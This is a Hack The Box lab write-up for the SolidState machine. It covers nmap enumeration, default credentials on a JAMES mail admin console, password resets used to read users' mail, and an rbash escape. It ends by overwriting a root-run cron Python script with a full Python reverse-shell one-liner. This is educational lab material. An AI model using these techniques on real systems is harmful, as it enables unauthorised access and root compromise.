---
description: https://app.hackthebox.com/machines/85
cover: ../../../.gitbook/assets/SolidState.png
coverY: -49.870466321243526
---

# SolidState

## Nmap

```
sudo nmap 10.10.10.51 -p- -sS -sV

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
25/tcp   open  smtp    JAMES smtpd 2.3.2
80/tcp   open  http    Apache httpd 2.4.25 ((Debian))
110/tcp  open  pop3    JAMES pop3d 2.3.2
119/tcp  open  nntp    JAMES nntpd (posting ok)
4555/tcp open  rsip?
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### James SMTP Server

Looking at our nmap results we see the target system is running JAMES 2.3.2 is an Apache mail server.&#x20;

Some quick research shows that RCE is possible on version 2.3.2. However, this is not our attack vector.&#x20;

The default login credentials for the admin interface on port 4555 is usually set to `root:root`. Connecting to the admin interface with telnet we are able to authenticate.

![](<../../../.gitbook/assets/image (1) (5).png>)

Running the HELP command we are then able to list known users using the `listusers` command.

![](<../../../.gitbook/assets/image (11) (1) (1).png>)

### Password Resetting

We also see a command for resetting a users password. From here I reset every single users password and then logged into `pop3` using `telnet` in an attempt to discover sensitive information contained within emails.

```
# Reset mindy's password
setpassword mindy password
```

Then login over telnet to pop3.

```
telnet 10.10.10.51 110

USER mindy
PASS password
LIST
```

![](<../../../.gitbook/assets/image (9) (4).png>)

Retrieving email index 2 we discover SSH credentials.

```
retr 2
```

![](<../../../.gitbook/assets/image (3) (5) (1).png>)

### SSH

We are then able to authenticate over SSH as the user Mindy.\


![](<../../../.gitbook/assets/image (2) (1) (1) (2) (1) (1).png>)

### Restricted Shell

After logging in we notice we are in a `rbash` shell which is a restricted shell. I have previously covered `rbash` shell escapes in "Sunset Decoy" where I will be using the same technique  to escape the restricted shell.

{% content-ref url="../../pg-play-or-vulnhub/linux/sunsetdecoy.md" %}
[sunsetdecoy.md](../../pg-play-or-vulnhub/linux/sunsetdecoy.md)
{% endcontent-ref %}

```bash
ssh mindy@10.10.10.51 -t "bash --noprofile"
```

![](<../../../.gitbook/assets/image (8) (4).png>)

### User Flag

We are then able to grab the `user.txt` flag.

![](<../../../.gitbook/assets/image (65).png>)

### Enumeration

After performing some basic enumeration steps I was unable to identify any interesting routes for escalation. I decided to upload a [`pspy`](https://github.com/DominicBreuker/pspy) binary to monitor for scheduled tasks and processes that might be running.

After uploading the binary to the target system I then change the permissions to allow execution.

```
chmod +x ./pspy32
```

Then executed the binary.\


In the output we notice the following python script is being executed on a regular interval.

![](<../../../.gitbook/assets/image (6) (2) (2) (1).png>)

Browsing to the file we notice it is owned by root. However, we have rights to edit the file.

![](<../../../.gitbook/assets/image (4) (1) (3).png>)

### Privilege Escalation

To take advantage of this for privilege escalation we can clear the contents of the file and use `nano` to input a Python reverse shell.

```
# Erase file contents
echo  > tmp.py
```

Then use nano to insert the following reverse shell:

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

![](<../../../.gitbook/assets/image (7) (4).png>)

### Root Flag

A few minutes later we will receive a **root** shell. Where we can then grab the `root.txt` flag.\


![](<../../../.gitbook/assets/image (10) (3).png>)
